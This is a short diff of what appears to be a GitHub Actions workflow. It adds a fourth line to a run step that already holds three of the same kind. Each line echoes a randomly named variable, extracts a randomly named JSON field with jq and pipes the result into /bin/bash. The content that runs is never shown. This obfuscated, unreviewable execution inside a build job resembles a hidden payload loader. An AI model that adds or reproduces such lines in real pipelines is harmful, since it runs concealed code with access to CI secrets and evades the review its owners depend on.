@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$iifqt3" | jq -r .cyvls3 | /bin/bash
           echo $ioe714 | jq -r .ypg9 | /bin/bash
           echo $rue4900 | jq -r .y8246 | /bin/bash
+          echo $pmjsq14 | jq -r .gp232 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
